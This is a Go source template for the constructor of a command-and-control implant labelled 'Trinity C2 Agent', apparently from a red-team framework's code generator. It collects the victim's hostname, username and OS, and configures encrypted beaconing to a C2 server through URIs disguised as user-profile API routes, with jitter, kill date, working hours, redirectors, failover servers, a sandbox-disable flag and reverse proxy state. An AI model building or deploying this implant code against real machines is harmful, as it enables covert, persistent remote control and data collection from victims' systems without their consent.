func New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost string, redirectorPort int, useRedirector bool, disableSandbox bool) (*{AGENT_STRUCT_NAME}, error) {
	var fernetKey fernet.Key

	if secretKey != "" {
		key, err := fernet.DecodeKey(secretKey)
		if err != nil {
			return nil, fmt.Errorf("failed to decode secret key: %v", err)
		}
		fernetKey = *key
	}

	hostname, _ := os.Hostname()
	username := os.Getenv("USERNAME")
	if username == "" {
		username = "unknown"
	}

	osInfo := runtime.GOOS + " " + runtime.GOARCH

	agent := &{AGENT_STRUCT_NAME}{
		{AGENT_C2_URL_FIELD}:               c2URL,
		{AGENT_ID_FIELD}:             agentID,
		{AGENT_HEADERS_FIELD}:             map[string]string{"User-Agent": "Trinity C2 Agent"},
		{AGENT_HEARTBEAT_INTERVAL_FIELD}:   60,
		{AGENT_JITTER_FIELD}:              0.2,
		{AGENT_REGISTER_URI_FIELD}:         "/api/users/register",
		{AGENT_TASKS_URI_FIELD}:            "/api/users/{agent_id}/profile",
		{AGENT_RESULTS_URI_FIELD}:          "/api/users/{agent_id}/activity",
		{AGENT_INTERACTIVE_URI_FIELD}:      "/api/users/{agent_id}/settings",
		{AGENT_INTERACTIVE_STATUS_URI_FIELD}: "/api/users/{agent_id}/status",
		{AGENT_HOSTNAME_FIELD}:            hostname,
		{AGENT_USERNAME_FIELD}:            username,
		{AGENT_OSINFO_FIELD}:              osInfo,
		{AGENT_SECRET_KEY_FIELD}:           &fernetKey,
		{AGENT_INTERACTIVE_MODE_FIELD}:     false,
		{AGENT_RUNNING_FIELD}:             false,
		{AGENT_CURRENT_INTERACTIVE_TASK_FIELD}: "",
		{AGENT_DISABLE_SANDBOX_FIELD}:      disableSandbox,
		{AGENT_KILL_DATE_FIELD}:            "{KILL_DATE}",
		{AGENT_WORKING_HOURS_FIELD}:        struct {
			StartHour int      `json:"start_hour"`
			EndHour   int      `json:"end_hour"`
			Timezone  string   `json:"timezone"`
			Days      []int    `json:"days"`
		}{
			StartHour: {WORKING_HOURS_START_HOUR},
			EndHour:   {WORKING_HOURS_END_HOUR},
			Timezone:  "{WORKING_HOURS_TIMEZONE}",
			Days:      []int{{WORKING_HOURS_DAYS}},
		},
		{AGENT_REDIRECTOR_HOST_FIELD}:       redirectorHost,
		{AGENT_REDIRECTOR_PORT_FIELD}:       redirectorPort,
		{AGENT_USE_REDIRECTOR_FIELD}:        useRedirector,
		{AGENT_FAILOVER_URLS_FIELD}:         {FAILOVER_URLS},
		{AGENT_USE_FAILOVER_FIELD}:          {USE_FAILOVER},
		{AGENT_CURRENT_C2_URL_FIELD}:        c2URL,
		{AGENT_CURRENT_FAIL_COUNT_FIELD}:    0,
		{AGENT_MAX_FAIL_COUNT_FIELD}:        15,  // Try main C2 for ~15 * heartbeat_interval before failover
		{AGENT_LAST_CONNECTION_ATTEMPT_FIELD}: time.Now(),
		{AGENT_IN_FAILOVER_ATTEMPT_FIELD}:   false,
		{AGENT_REVERSE_PROXY_ACTIVE_FIELD}:  false,
		{AGENT_REVERSE_PROXY_STOP_CHAN_FIELD}: nil,
		{AGENT_REVERSE_PROXY_LOCK_FIELD}:    sync.Mutex{},
	}

	return agent, nil
}